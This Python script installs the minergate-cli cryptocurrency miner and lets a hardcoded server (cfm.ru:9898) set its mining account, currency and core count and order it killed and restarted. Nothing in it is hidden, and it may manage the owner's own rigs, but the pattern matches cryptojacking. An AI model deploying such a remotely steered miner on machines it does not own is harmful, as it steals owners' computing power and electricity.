import subprocess
import sys
from colors import *

def Msg(data,type):
    if type == 'error':
        sys.stdout.write(RED)
        print(data)
        sys.stdout.write(RESET)
    if type == 'ok':
        sys.stdout.write(BLUE)
        print('========== '+data+' ============')
        sys.stdout.write(RESET)


def Initialize():
    try:
        subprocess.call(["pip3","install","-r","requirements.txt"])
        Msg('Module setup completed','ok')
    except:
        Msg('Module setup completed','error')
    try:
        subprocess.call(["dpkg","-i","minergate-cli.deb","-y"])
        Msg('Install for debian base','ok')
        return True
    except:
        Msg('NO deb','error')

    try:
        sys.stdout.write(RESET)
        subprocess.call(["dnf","install","minergate-cli.rpm","-y"])
        Msg('Install for RHEL base','ok')
        return True
    except:
        Msg('NO RHEL','error')


Initialize()


import requests as req
import os
import sh
import signal
import json
import socket
import traceback



uuid = '50c441ab-05a0-423f-a511-3b93a7dfa29c'
index = '5'



def GetMac():
    try:
        import re, uuid
        return (':'.join(re.findall('..', '%012x' % uuid.getnode())))
    except Exception:
        Msg('MAC NOT FOUND','error')
        sys.stdout.write(RESET)
        print(traceback.format_exc())


def GetIpAddress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]



def GetCores():
    return os.cpu_count()


print(GetMac(),GetCores())




def StartMiner():
    r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
    param = json.loads(r.text)
    p = subprocess.Popen(["minergate-cli", "--user",param[0]['mail'], "--"+param[0]['val']+"",str(param[0]['core'])],stdout=subprocess.PIPE)
    return True


def CheckProcess():
    try:
        pid = sh.pgrep(sh.ps("aux"), 'minergate-cli')
        return True
    except:
        return False



def KillProcess():
    try:
        pid = sh.pgrep(sh.ps("aux"), 'minergate-cli')

        for a in pid.split('\n'):
            if a != '':
                os.kill(int(a), signal.SIGKILL)
        return True
    except:
        return False




r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index='+index)
param = json.loads(r.text)

if param[0]['change'] == True:
    KillProcess()
    StartMiner()
    r = req.get('http://cfm.ru:9898/api/?uuid='+uuid+'&index='+index+'&val=reload')
else:
    pass


#print(KillProcess())
#print(StartMiner())
#print(CheckProcess())

#print(KillProcess())

#r = req.get('http://cfm.ru:9898/?uuid='+uuid+'&index=3')
#print(r.text)
